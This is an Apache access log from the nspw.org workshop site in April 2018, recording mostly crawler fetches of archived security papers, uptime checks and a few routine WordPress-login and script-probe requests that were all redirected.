www.nspw.org:80 112.203.227.105 - - [26/Apr/2018:08:01:53 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:08:02:04 -0400] "GET /papers/2007/nspw2007-kursawe.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:08:02:39 -0400] "GET /2003/oc.shtml.bak HTTP/1.1" 302 563 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 216.244.66.200 - - [26/Apr/2018:08:02:44 -0400] "GET /2005/cfp/latex/toplas.tex HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 216.244.66.200 - - [26/Apr/2018:08:02:54 -0400] "GET /2005/cfp/latex/ieee.clo HTTP/1.1" 302 519 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 216.244.66.200 - - [26/Apr/2018:08:04:00 -0400] "GET /2009/invite/ HTTP/1.1" 302 497 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 54.36.149.29 - - [26/Apr/2018:08:04:19 -0400] "GET /sponsors-2010 HTTP/1.1" 302 499 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:08:04:22 -0400] "GET /papers/2004/nspw2004-gates.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 216.244.66.200 - - [26/Apr/2018:08:04:31 -0400] "GET /2009/proceedings/2005/?C=S;O=A HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 69.162.124.227 - - [26/Apr/2018:08:05:40 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.65.119 - - [26/Apr/2018:08:06:06 -0400] "GET /2016 HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:08:07:49 -0400] "GET /2008/cfp2008-old.pdf HTTP/1.1" 302 569 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.93.78 - - [26/Apr/2018:08:08:22 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:08:09:33 -0400] "GET /papers/2001/ HTTP/1.1" 302 553 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 157.55.39.221 - - [26/Apr/2018:08:09:34 -0400] "GET /2014 HTTP/1.1" 302 537 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:08:10:25 -0400] "GET /cfp/nspw2010-cfp.pdf HTTP/1.1" 302 569 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [26/Apr/2018:08:10:40 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:08:11:17 -0400] "GET /2012/papers HTTP/1.1" 302 551 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:08:12:08 -0400] "GET /2015/sponsors HTTP/1.1" 302 555 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:08:13:00 -0400] "GET /2009/proceedings/1998/nspw1998-cowan.pdf HTTP/1.1" 302 609 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:08:13:52 -0400] "GET /2009/proceedings/2013/nspw2013-ashenden.pdf HTTP/1.1" 302 615 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:08:14:44 -0400] "GET /papers/2004/nspw2004-zhou.pdf HTTP/1.1" 302 587 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [26/Apr/2018:08:15:40 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:08:16:28 -0400] "GET /2005/cfp/latex/main.tex HTTP/1.1" 302 575 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:08:17:19 -0400] "GET /papers/2013/nspw2013-mathur.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:08:18:11 -0400] "GET /papers/2006/nspw2006-naegoe.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:08:19:03 -0400] "GET /2008/oc.content.qq HTTP/1.1" 302 565 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:08:19:55 -0400] "GET /papers/2010/nspw2010-bishop.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 115.98.161.53 - - [26/Apr/2018:08:20:42 -0400] "GET /2009/proceedings/1993/nspw1993-slack.pdf HTTP/1.1" 302 609 "https://www.google.co.in/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
www.nspw.org:80 66.249.65.115 - - [26/Apr/2018:08:20:46 -0400] "GET /papers/1994/nspw1994-ferris.pdf HTTP/1.1" 302 587 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 216.244.66.236 - - [26/Apr/2018:08:20:47 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 ::1 - - [26/Apr/2018:08:20:55 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [26/Apr/2018:08:20:56 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [26/Apr/2018:08:20:57 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 112.207.111.251 - - [26/Apr/2018:08:21:13 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 112.207.111.251 - - [26/Apr/2018:08:21:16 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:08:21:38 -0400] "GET /papers/2012/docs/p141.pdf HTTP/1.1" 302 579 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [26/Apr/2018:08:22:22 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:08:22:30 -0400] "GET /papers/1993/nspw1993-strens.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:08:22:31 -0400] "GET /papers/1997/nspw1997-rahman.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 54.36.148.155 - - [26/Apr/2018:08:22:53 -0400] "GET /2007/jmu_infosec_logo.gif HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:08:23:22 -0400] "GET /papers/1996/nspw1996-olawsky.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:08:24:14 -0400] "GET /papers/2011/nspw2011-feigenbaum.pdf HTTP/1.1" 302 599 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:08:25:05 -0400] "GET /login HTTP/1.1" 302 539 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:08:25:57 -0400] "GET /papers/2002/nspw2002-williams.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:08:26:49 -0400] "GET /papers/2001/nspw2001-raskin.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 54.36.149.102 - - [26/Apr/2018:08:26:54 -0400] "GET /2003/program.shtml.bak HTTP/1.1" 302 517 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 69.162.124.227 - - [26/Apr/2018:08:27:22 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:08:27:41 -0400] "GET /papers/2008/nspw2008-bishop.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:08:28:33 -0400] "GET /2015/cfp HTTP/1.1" 302 545 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:08:29:24 -0400] "GET /papers/1996/nspw1996-millen.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:08:30:16 -0400] "GET /papers/1997/nspw1997-timmerman.pdf HTTP/1.1" 302 597 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:08:31:08 -0400] "GET /papers/2000/nspw2000-marceau.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:08:32:00 -0400] "GET /2002 HTTP/1.1" 302 537 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [26/Apr/2018:08:32:22 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 94.103.232.82 - - [26/Apr/2018:08:32:47 -0400] "GET /papers/2012/docs/p141.pdf HTTP/1.1" 302 579 "http://www.nspw.org/" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:08:32:52 -0400] "GET /papers/1999/nspw1999-henning.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 94.103.232.82 - - [26/Apr/2018:08:33:17 -0400] "GET / HTTP/1.1" 302 529 "http://www.nspw.org" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
www.nspw.org:80 202.131.110.172 - - [26/Apr/2018:08:33:23 -0400] "GET /wp-login.php HTTP/1.1" 302 549 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 202.131.110.172 - - [26/Apr/2018:08:33:25 -0400] "GET / HTTP/1.1" 302 524 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:08:33:43 -0400] "GET /2006/cfp/?C=M;O=A HTTP/1.1" 302 563 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:08:35:27 -0400] "GET /papers/2006/nspw2006-crawford.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:08:36:19 -0400] "GET /papers/1994/nspw1994-castano.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [26/Apr/2018:08:37:22 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:08:38:02 -0400] "GET /papers/1993/nspw1993-rooker-2.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:08:38:14 -0400] "GET /papers/2009/nspw2009-jakobsson.pdf HTTP/1.1" 302 597 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:08:38:54 -0400] "GET /papers/2011/nspw2011-bicakci.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 179.199.152.82 - - [26/Apr/2018:08:38:56 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 179.199.152.82 - - [26/Apr/2018:08:38:59 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 54.36.148.82 - - [26/Apr/2018:08:39:08 -0400] "GET /2008/registration.content HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 88.164.232.34 - - [26/Apr/2018:08:39:11 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 302 591 "https://scholar.google.fr/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:08:39:46 -0400] "GET /papers/2005/nspw2005-taylor-panel.pdf HTTP/1.1" 302 603 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 187.79.21.161 - - [26/Apr/2018:08:40:01 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 88.164.232.34 - - [26/Apr/2018:08:40:02 -0400] "-" 408 0 "-" "-"
www.nspw.org:80 88.164.232.34 - - [26/Apr/2018:08:40:02 -0400] "-" 408 0 "-" "-"
www.nspw.org:80 187.79.21.161 - - [26/Apr/2018:08:40:03 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 216.244.66.200 - - [26/Apr/2018:08:40:36 -0400] "GET /2006/cfp/?C=N;O=A HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:08:40:38 -0400] "GET /papers/1993/nspw1993-meadows.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 111.68.102.124 - - [26/Apr/2018:08:41:02 -0400] "GET /2009/proceedings/2000/nspw2000-mcdermott.pdf HTTP/1.1" 302 617 "https://scholar.google.com.pk/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
www.nspw.org:80 58.186.201.98 - - [26/Apr/2018:08:41:03 -0400] "HEAD / HTTP/1.1" 302 169 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
www.nspw.org:80 185.76.70.34 - - [26/Apr/2018:08:41:05 -0400] "HEAD / HTTP/1.1" 302 169 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1"
www.nspw.org:80 ::1 - - [26/Apr/2018:08:41:26 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [26/Apr/2018:08:41:27 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 157.55.39.221 - - [26/Apr/2018:08:41:30 -0400] "GET /papers/2014-pre/gates-nspw2014pre.pdf HTTP/1.1" 302 603 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 111.68.102.124 - - [26/Apr/2018:08:41:53 -0400] "-" 408 0 "-" "-"
www.nspw.org:80 111.68.102.124 - - [26/Apr/2018:08:41:53 -0400] "-" 408 0 "-" "-"
www.nspw.org:80 175.158.216.35 - - [26/Apr/2018:08:42:17 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 175.158.216.35 - - [26/Apr/2018:08:42:19 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:08:42:21 -0400] "GET /papers/1993/nspw1993-thuraisingham.pdf HTTP/1.1" 302 605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [26/Apr/2018:08:42:22 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:08:42:36 -0400] "GET /papers/2008/nspw2008-bishop.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 79.167.45.218 - - [26/Apr/2018:08:44:39 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 79.167.45.218 - - [26/Apr/2018:08:44:40 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 158.69.133.31 - - [26/Apr/2018:08:44:47 -0400] "POST /loikfd.php HTTP/1.1" 302 493 "-" "curl/7.47.0"
www.nspw.org:80 158.69.133.31 - - [26/Apr/2018:08:44:48 -0400] "POST /loikfd.php HTTP/1.1" 302 493 "-" "curl/7.47.0"
www.nspw.org:80 158.69.133.31 - - [26/Apr/2018:08:44:49 -0400] "POST /loikfd.php HTTP/1.1" 302 493 "-" "curl/7.47.0"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:08:44:57 -0400] "GET /papers/2011/nspw2011-du.pdf HTTP/1.1" 302 583 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:08:45:49 -0400] "GET /papers/2005/nspw2005-van_oorschot.pdf HTTP/1.1" 302 603 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [26/Apr/2018:08:47:22 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:08:49:16 -0400] "GET /papers/2009/nspw2009-verendel.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.102.7.46 - - [26/Apr/2018:08:49:27 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
www.nspw.org:80 35.173.200.32 - - [26/Apr/2018:08:49:56 -0400] "GET /papers/2006/nspw2006-ford.pdf HTTP/1.1" 302 587 "-" "python-requests/2.18.4"
www.nspw.org:80 114.236.35.253 - - [26/Apr/2018:08:50:47 -0400] "GET /themes/garland/fix-ie.css HTTP/1.1" 302 579 "-" "Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; vivo X5S L Build/KTU84P) AppleWebKit/534.24 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.24"
www.nspw.org:80 197.156.77.160 - - [26/Apr/2018:08:50:53 -0400] "GET /papers/2008/nspw2008-julisch.pdf HTTP/1.1" 302 593 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:08:50:59 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 197.156.77.160 - - [26/Apr/2018:08:51:44 -0400] "-" 408 0 "-" "-"
www.nspw.org:80 69.162.124.227 - - [26/Apr/2018:08:52:22 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:08:52:43 -0400] "GET /2005/cfp/cfp.txt HTTP/1.1" 302 561 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:08:54:58 -0400] "GET /papers/1993/nspw1993-hosmer-2.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 157.55.39.221 - - [26/Apr/2018:08:55:39 -0400] "GET /papers/2014-pre/edwards-nspw2014pre.pdf HTTP/1.1" 302 607 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 54.36.149.28 - - [26/Apr/2018:08:56:00 -0400] "GET /2001/cfp.html HTTP/1.1" 302 499 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:08:56:10 -0400] "GET /2005/?C=M;O=A HTTP/1.1" 302 555 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:08:57:02 -0400] "GET /2009/proceedings/2001/nspw2001-sekar.pdf HTTP/1.1" 302 609 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 54.36.148.120 - - [26/Apr/2018:08:57:02 -0400] "GET /2008 HTTP/1.1" 302 481 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 69.162.124.227 - - [26/Apr/2018:08:57:22 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:08:57:54 -0400] "GET /2009/proceedings/2008/nspw2008-wurster.pdf HTTP/1.1" 302 613 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 45.243.14.4 - - [26/Apr/2018:08:58:40 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:08:58:46 -0400] "GET /papers/2010/nspw2010-sun.pdf HTTP/1.1" 302 585 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:08:59:37 -0400] "GET /2005/?C=M;O=A HTTP/1.1" 302 555 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:09:00:29 -0400] "GET /papers/2002/nspw2002-ashley.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 54.89.196.113 - - [26/Apr/2018:09:01:14 -0400] "GET / HTTP/1.1" 302 525 "-" "Mozilla/5.0 (compatible; linkdexbot/2.0; +http://www.linkdex.com/bots/)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:09:01:21 -0400] "GET /papers/2001/nspw2001-balacheff.pdf HTTP/1.1" 302 597 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 216.244.66.200 - - [26/Apr/2018:09:02:02 -0400] "GET /papers/1995/?C=D;O=D HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
